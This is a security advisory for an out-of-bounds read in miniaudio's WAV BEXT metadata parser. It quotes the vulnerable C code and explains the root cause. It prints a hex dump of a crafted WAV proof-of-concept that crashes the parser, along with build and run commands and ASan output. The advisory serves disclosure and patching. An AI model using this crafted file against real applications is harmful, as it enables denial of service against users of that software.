# mackron / miniaudio Out-of-Bounds Read in BEXT Coding History Parsing

- **CVE ID:** [CVE-2026-32837](https://www.cve.org/CVERecord?id=CVE-2026-32837)
- **Product:** [miniaudio](https://github.com/mackron/miniaudio)
- **Reported:** 2026-03-09
- **Published:** 2026-03-17
- **Severity:** Medium
- **CWE:** [CWE-170 Improper Null Termination](https://cwe.mitre.org/data/definitions/170.html)
- **Discovered by:** Ana Kapulica of Marlink Cyber

---

## Summary

miniaudio version 0.11.25 and earlier contain a heap out-of-bounds read vulnerability in the WAV BEXT metadata parser that allows attackers to trigger memory access violations by processing crafted WAV files. Attackers can exploit improper null-termination handling in the coding history field to cause out-of-bounds reads past the allocated metadata pool, resulting in application crashes or denial of service.

---

## Affected Versions

| Version              | Status    |
| -------------------- | --------- |
| miniaudio <= v0.11.25   | Vulnerable |

---

## Proof of Concept

### Affected code

**`miniaudio.h` lines 80803–80808 - `ma_dr_wav__read_bext_to_metadata_obj`:**

```c
extraBytes = (size_t)(chunkSize - MA_DR_WAV_BEXT_BYTES);
if (extraBytes > 0) {
    pMetadata->data.bext.pCodingHistory = (char*)ma_dr_wav__metadata_get_memory(pParser, extraBytes + 1, 1);
    MA_DR_WAV_ASSERT(pMetadata->data.bext.pCodingHistory != NULL);
    bytesRead += ma_dr_wav__metadata_parser_read(pParser, pMetadata->data.bext.pCodingHistory, extraBytes, NULL);
    pMetadata->data.bext.codingHistorySize = (ma_uint32)ma_dr_wav__strlen(pMetadata->data.bext.pCodingHistory);
    //                                                  ^^^^^^^^^^^^^^^^^ null terminator never written
}
```

**`miniaudio.h` line 80498 - pool allocator:**
```c
pParser->pData = (ma_uint8*)pAllocationCallbacks->onMalloc(ma_dr_wav__metadata_memory_capacity(pParser), pAllocationCallbacks->pUserData);
// malloc() — uninitialized memory, no calloc/memset
```

**`miniaudio.h` lines 80656–80663 - unbounded strlen:**
```c
MA_PRIVATE size_t ma_dr_wav__strlen(const char* str)
{
    size_t result = 0;
    while (*str++) {   // reads until null byte — no bounds check
        result += 1;
    }
    return result;
}
```

---

### Root cause

The Stage 2 BEXT reader:

1. Allocates `extraBytes + 1` bytes from the pool (the `+1` is intended as the null terminator slot).
2. Reads `extraBytes` bytes from the file into the buffer.
3. **Never writes `'\0'` at `pCodingHistory[extraBytes]`.**
4. Calls `ma_dr_wav__strlen(pCodingHistory)` — which scans forward until a null byte with no bound.

Because the pool comes from `malloc()`, the `+1` slot (and anything beyond the pool) is uninitialized. If no null byte is encountered in the remaining pool memory, `strlen` reads past the entire allocation.

The bug is not masked by debug assertions: the pool is exactly sized to hold all Stage 2 allocations, so no assertion fires before the `strlen` call. The OOB read occurs in both debug and release builds.

---

#### Triggering file structure

```
$ xxd /home/ana/fuzzing-lab/miniaudio/issue/poc_bext_no_null.bin
00000000: 5249 4646 9502 0000 5741 5645 666d 7420  RIFF....WAVEfmt 
00000010: 1000 0000 0100 0100 401f 0000 803e 0000  ........@....>..
00000020: 0200 1000 6461 7461 0000 0000 6265 7874  ....data....bext
00000030: 6902 0000 0000 0000 0000 0000 0000 0000  i...............
00000040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000000f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000100: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000110: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000120: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000130: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000140: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000150: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000160: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000170: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000180: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000190: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000001f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000200: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000210: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000220: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000230: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000240: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000250: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000260: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000270: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000280: 0000 0000 0000 0000 0000 0000 0000 5057  ..............PW
00000290: 4d3b 7369 7a65 3a34 3431 3030 3b         M;size:44100;
```

```
RIFF<size>WAVE
  fmt  chunk:  PCM, 1 ch, 8000 Hz, 16-bit
  data chunk:  0 bytes
  bext chunk:  617 bytes (602-byte fixed BEXT header + 15-byte coding history)
    [602 bytes: all zeros]
    [15 bytes: "PWM;size:44100;" — no null terminator]
```

`extraBytes = 617 - 602 = 15`. Pool allocates 16 bytes via uninitialized `malloc`. After reading 15 non-null bytes, `strlen` scans the 16th byte and beyond until ASAN fires at the pool boundary.

#### Reproduce

```bash
# Build
clang -fsanitize=address -g -O1 -I/path/to/miniaudio repro.c -lm -o repro

# Run
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:halt_on_error=1 ./repro poc_bext_no_null.bin
```

`repro.c` and `poc_bext_no_null.bin` are attached.

[crash.zip](./MCSAID-2026-003-crash.zip)

#### ASan output

```
==3350==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x511000000103 at pc 0x62a82ed8b639 bp 0x7ffc1ca66bf0 sp 0x7ffc1ca66be8
READ of size 1 at 0x511000000103 thread T0
    #0 0x62a82ed8b638 in ma_dr_wav__strlen /home/ana/fuzzing-lab/miniaudio/miniaudio.h:80659:12
    #1 0x62a82ed8b638 in ma_dr_wav__read_bext_to_metadata_obj /home/ana/fuzzing-lab/miniaudio/miniaudio.h:80808:69
    #2 0x62a82ed88665 in ma_dr_wav__metadata_process_chunk /home/ana/fuzzing-lab/miniaudio/miniaudio.h:81042:29
    #3 0x62a82ed4cd30 in ma_dr_wav_init__internal /home/ana/fuzzing-lab/miniaudio/miniaudio.h:81636:33
    #4 0x62a82ed75c5b in ma_dr_wav_init_memory_with_metadata /home/ana/fuzzing-lab/miniaudio/miniaudio.h:82665:12
    #5 0x62a82ed75c5b in main /home/ana/fuzzing-lab/miniaudio/issue/repro.c:40:5
    #6 0x76819902a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #7 0x76819902a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #8 0x62a82ebd4434 in _start (/tmp/repro_debug+0x39434) (BuildId: b236ed4e2088b9a92082a43c21fe007241c3832d)

0x511000000103 is located 0 bytes after 195-byte region [0x511000000040,0x511000000103)
allocated by thread T0 here:
    #0 0x62a82ec6f283 in malloc (/tmp/repro_debug+0xd4283) (BuildId: b236ed4e2088b9a92082a43c21fe007241c3832d)
    #1 0x62a82ed8a122 in ma_dr_wav__metadata_alloc /home/ana/fuzzing-lab/miniaudio/miniaudio.h:80498:37

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/ana/fuzzing-lab/miniaudio/miniaudio.h:80659:12 in ma_dr_wav__strlen
Shadow bytes around the buggy address:
  0x510ffffffe80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x510fffffff00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x510fffffff80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x511000000000: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
  0x511000000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x511000000100:[03]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x511000000180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x511000000200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x511000000280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x511000000300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x511000000380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==3350==ABORTING
```

---

## Impact

A crafted WAV file with an unterminated BEXT coding history field causes ma_dr_wav__strlen to read past the end of the heap-allocated metadata pool, resulting in a heap out-of-bounds read and application crash. Any application parsing WAV metadata via miniaudio is affected.

---

## Mitigations

- [1df46ae9a0eed5aa9f58b179d2cc4af5d23f8bde](https://github.com/mackron/miniaudio/commit/1df46ae9a0eed5aa9f58b179d2cc4af5d23f8bde)
- [04e40d66a7ba1632f93ec1328d4b42ad986e3ee0](https://github.com/mackron/dr_libs/commit/04e40d66a7ba1632f93ec1328d4b42ad986e3ee0) -> Upstream patch

---

## References

- GitHub Issue: [Heap buffer overflow (read) in ma_dr_wav__strlen (miniaudio.h:80659)](https://github.com/mackron/miniaudio/issues/1101)

